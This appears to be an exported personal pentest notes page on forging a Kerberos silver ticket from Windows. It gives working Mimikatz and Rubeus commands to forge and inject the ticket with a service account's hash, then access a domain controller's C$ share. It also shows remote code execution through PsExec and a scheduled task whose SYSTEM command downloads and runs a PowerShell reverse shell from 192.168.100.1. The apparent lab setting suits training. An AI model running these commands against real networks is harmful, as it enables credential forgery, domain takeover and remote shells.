<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>from Windows</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Craft Silver Ticket from Windows</h1></strong><br /><br /><div class="codebox"><div class="codebox">#&nbsp;CRAFT&nbsp;TICKET<br />#&nbsp;&nbsp;&nbsp;-&nbsp;there&#39;s&nbsp;no&nbsp;kerberos::silver&nbsp;module<br />#&nbsp;&nbsp;&nbsp;-&nbsp;specifying&nbsp;/service:&nbsp;is&nbsp;what&nbsp;makes&nbsp;it&nbsp;a&nbsp;silver&nbsp;ticket<br />#&nbsp;-------------------------------------------<br />Invoke-Mimikatz&nbsp;-Command&nbsp;&#39;&quot;kerberos::golden&nbsp;/domain:dollarcorp.moneycorp.local&nbsp;/sid:&lt;domain&nbsp;sid&gt;&nbsp;/target:domain-controller.dollarcorp.moneycorp.local&nbsp;/service:CIFS&nbsp;/rc4:6f5b5...&nbsp;/user:Administrator&nbsp;/ptt&quot;&#39;<br /><br />#&nbsp;kerberos::golden&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;THERE&#39;S&nbsp;NO&nbsp;silver&nbsp;module!<br />#&nbsp;/user:Administrator&nbsp;-&nbsp;username&nbsp;for&nbsp;which&nbsp;the&nbsp;TGS&nbsp;is&nbsp;generated<br />#&nbsp;/domain:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;domain&nbsp;FQDN<br />#&nbsp;/sid:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;SID&nbsp;of&nbsp;the&nbsp;domain<br />#&nbsp;/target:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;target&nbsp;server&nbsp;FQDN<br />#&nbsp;/service:cifs&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;the&nbsp;SPN&nbsp;name&nbsp;of&nbsp;service&nbsp;for&nbsp;which&nbsp;TGS&nbsp;to&nbsp;be&nbsp;created.&nbsp;CIFS&nbsp;=&nbsp;filesystem<br />#&nbsp;/rc4:6f6b5a...&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;NTLM&nbsp;(RC4)&nbsp;hash&nbsp;of&nbsp;service&nbsp;account.&nbsp;use&nbsp;/aes128&nbsp;or&nbsp;/aes256&nbsp;for&nbsp;AES&nbsp;keys<br />#&nbsp;/id:500&nbsp;/groups:512&nbsp;-&nbsp;OPTIONAL&nbsp;-&nbsp;set&nbsp;user&nbsp;ID&nbsp;and&nbsp;group&nbsp;ID<br />#&nbsp;/ptt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;inject&nbsp;ticket&nbsp;in&nbsp;current&nbsp;PowerShell&nbsp;process&nbsp;(no&nbsp;write&nbsp;to&nbsp;disk)<br /><br />#&nbsp;INJECT&nbsp;TICKET&nbsp;(if&nbsp;didn&#39;t&nbsp;use&nbsp;/ptt&nbsp;to&nbsp;inject&nbsp;into&nbsp;current&nbsp;powershell&nbsp;process)<br />#&nbsp;-------------------------------------------<br />#&nbsp;Mimikatz<br />kerberos::ptt&nbsp;&lt;ticket_kirbi_file&gt;<br />#&nbsp;Rubeus<br />.\Rubeus.exe&nbsp;ptt&nbsp;/ticket:&lt;ticket_kirbi_file&gt;<br />#&nbsp;Rubeus&nbsp;-&nbsp;inject&nbsp;from&nbsp;base64&nbsp;blob<br />.\Rubeus.exe&nbsp;ptt&nbsp;/ticket:BASE64BLOBHERE<br /><br />#&nbsp;list&nbsp;tickets<br />klist<br /><br />#&nbsp;USE<br />#&nbsp;&nbsp;&nbsp;-&nbsp;any&nbsp;PSRemoting,&nbsp;WMI,&nbsp;WinRM&nbsp;stuff&nbsp;should&nbsp;work&nbsp;(providing&nbsp;the&nbsp;ticket&nbsp;gives&nbsp;you&nbsp;access)<br />#&nbsp;-------------------------------------------<br />dir&nbsp;\\domain-controller.dollarcorp.moneycorp.local\C$<br /><br />#&nbsp;REMOTE&nbsp;CODE&nbsp;EXECUTION&nbsp;WITH&nbsp;SILVER&nbsp;TICKET<br />#&nbsp;-------------------------------------------<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;with&nbsp;HOST&nbsp;service<br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;-------------------------------------------<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;PsExec.exe<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;-------------------------------------------<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.\PsExec.exe&nbsp;-accepteula&nbsp;\\&lt;remote_hostname&gt;&nbsp;cmd&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;schtask<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;-------------------------------------------<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;1.&nbsp;List&nbsp;tasks&nbsp;to&nbsp;test&nbsp;that&nbsp;Silver&nbsp;Ticket&nbsp;works<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;schtasks&nbsp;/S&nbsp;domain-controller.dollarcorp.moneycorp.local<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;2.&nbsp;Schedule&nbsp;a&nbsp;task&nbsp;on&nbsp;the&nbsp;domain&nbsp;controller<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;schtasks&nbsp;/create&nbsp;/S&nbsp;domain-controller.dollarcorp.monoeycorp.local&nbsp;/SC&nbsp;Weekly&nbsp;/RU&nbsp;&quot;NT&nbsp;Authority\SYSTEM&quot;&nbsp;/TN&nbsp;&quot;STCheck&quot;&nbsp;/TR&nbsp;&quot;powershell.exe&nbsp;-c&nbsp;&#39;iex&nbsp;(New-Object&nbsp;Net.WebClient).DownloadString(&#39;&#39;http://192.168.100.1:8080/Invoke-PowerShellTcp.ps1&#39;&#39;)&#39;&quot;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;3.&nbsp;Execute&nbsp;task<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;schtasks&nbsp;/Run&nbsp;/S&nbsp;domain-controller.dollarcorp.moneycorp.local&nbsp;/TN&nbsp;&quot;STCheck&quot;</div></div></div>
</body>
</html>
